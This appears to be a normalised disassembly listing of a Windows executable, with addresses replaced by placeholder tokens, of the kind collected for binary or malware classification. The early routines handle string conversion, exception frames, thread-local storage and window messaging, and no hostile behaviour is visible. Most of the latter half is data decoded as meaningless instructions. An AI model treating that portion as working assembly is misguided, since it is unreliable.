add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405e90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405f2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404120
mov eax ebx
xor edx edx
call sub_4049a4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f36
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
call sub_404998
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_40476c
mov eax ebx
call sub_404998
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
inc eax
push eax
mov eax ebx
call sub_404988
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
pop ecx
pop edx
call sub_405c7c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404120
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40476c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404174
sub_405f3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405fd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40482c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fda
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
mov eax ebx
call sub_4043e0
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404a74
mov eax ebx
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_404998
inc eax
push eax
mov eax ebx
call sub_4045e0
push eax
mov eax [ ebp - 0x4 ]
call sub_404988
pop ecx
pop edx
call sub_405d58
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40482c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a74
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404868
sub_405fe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_406023
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404978
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405e90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40602a
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_406030
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404318
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405580
push eax
call sub_401384
mov ecx eax
mov edx esp
mov eax esi
call sub_404210
jmp r-xdata
sub_406088
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_4060ee
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40134c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404390
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402dc4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4060f5
lea eax [ ebp - 0x10 ]
call sub_404120
retn
xor ebx ebx
sub_4060fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406146
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40614d
retn
mov eax rw-data
call sub_402c00
mov eax rw-data
call sub_402c00
mov eax rw-data
call sub_402c00
call sub_401bb8
sub_406150
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404f6c
call sub_4031d0
test al al
je r-xdata
call sub_4032c4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401404
mov [ rw-data ] eax
call sub_4013fc
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403200
call sub_401374
call sub_406088
mov [ rw-data ] eax
call sub_4013fc
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_401374
call sub_406088
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013f4
mov [ rw-data ] eax
sub_406258
push ebx
call sub_406250
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_406244
test eax eax
jne r-xdata
mov eax 0xe2
call sub_404114
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_404114
sub_40629c
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406258
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4062e8
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_406224
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_4062dc
mov edx rw-data
mov eax ebx
call sub_403e68
pop ebx
retn
sub_40632c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406351
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406358
retn
sub_4063a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4063bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4063e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4063e8
retn
sub_406f28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402b58
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402b48
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406f80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402b58
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402b48
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406fd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4070cd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4070f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4070fc
retn
sub_407108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40712d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407134
retn
sub_407140
push 0xf0004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax + 0x680000ff ] dh
jbe r-xdata
add [ edx + 0x680000ff ] bh
jbe r-xdata
add [ ecx + 0x680000ff ] dh
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] ah
dec eax
add [ ebx + 0x680000ff ] bh
jbe r-xdata
add [ edx + 0x680000ff ] dh
jbe r-xdata
add [ edi + 0x680000ff ] ch
jbe r-xdata
add [ esi + 0x680000ff ] ah
jbe r-xdata
add [ ebp + 0x680000ff ] ah
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] bh
dec eax
add [ ebx + 0x680000ff ] dh
jbe r-xdata
jbe r-xdata
add [ eax + 0x680000ff ] dl
jbe r-xdata
add [ edi + 0x680000ff ] ah
jbe r-xdata
add [ esi + 0x680000ff ] bh
jbe r-xdata
add [ ebp + 0x680000ff ] bh
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] dh
dec eax
add [ ebp + 0x680000ff ] dh
jbe r-xdata
xor eax [ eax ]
xor [ ebx ] 0x40
add [ esi ] cl
add [ ecx ] al
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x680000ff ] dl
jbe r-xdata
add [ eax + 0x680000ff ] ch
jbe r-xdata
add [ edi + 0x680000ff ] bh
jbe r-xdata
add [ esi + 0x680000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
inc esp
jne r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
je r-xdata
add ah bl
je r-xdata
add [ edx + 0x550000ff ] dl
mov ebp esp
add [ ecx + 0x680000ff ] ch
jbe r-xdata
add [ eax + 0x680000ff ] ah
jbe r-xdata
add [ edi + 0x680000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] bl
mov esi 0x33800040
add [ eax ] bl
mov esi 0x33800040
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] al
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
xor eax eax
push ebp
push r-xdata
add [ edx + 0x680000ff ] ch
jbe r-xdata
add [ ecx + 0x680000ff ] ah
jbe r-xdata
add [ eax + 0x680000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x40 ] dl
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8c ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] al
push esp
jbe r-xdata
lea eax [ eax ]
loopne r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004075 ] ah
add [ eax ] al
add al bh
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jne r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
add [ ebx + 0x680000ff ] ch
jbe r-xdata
add [ edx + 0x680000ff ] ah
jbe r-xdata
add [ ecx + 0x680000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x100040 ] ch
add [ eax ] al
or [ esi + 0x40 ] dh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8c ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xb004033 ] al
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
sbb [ esi + 0x33800040 ] bh
cld
jne r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8c ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
xor [ esi + 0x48 ] 0x0
add [ edi + edi * 8 + 0x76680000 ] ch
dec eax
add [ ebx + 0x680000ff ] ah
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x40 ] ah
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x77
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jbe r-xdata
outsd
jb r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
imul ebp [ edi + 0x6e ] 0x4075a090
add [ eax ] al
add [ eax ] al
add bl al
jmp sub_403b24
add [ esi + 0x680000ff ] ch
jbe r-xdata
add [ ebp + 0x680000ff ] ch
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x100040 ] bh
add [ eax ] al
shl [ esi + 0x40 ] 0x0
fdiv [ 0x35e40040 ]
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
mov esp 0x4077
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edx ] cl
jb r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0x12004033 ] al
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
insb
mov eax eax
lodsb [ esi ]
jbe r-xdata
jbe r-xdata
clc
pop ebp
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x10004077
add [ eax ] al
add al al
jbe r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add al al
jbe r-xdata
js r-xdata
add [ eax ] al
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xb004033 ] al
add al bl
xor eax 0x35e40040
inc eax
shl [ edi + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
imul ebp [ edi + 0x6e ] 0x40770c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40792090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
js r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] dh
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xc004033 ] al
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx + 0x40 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + edi * 2 ] ah
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
add [ eax ] dl
add [ eax ] al
add [ eax + edi * 2 ] ah
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + edi * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
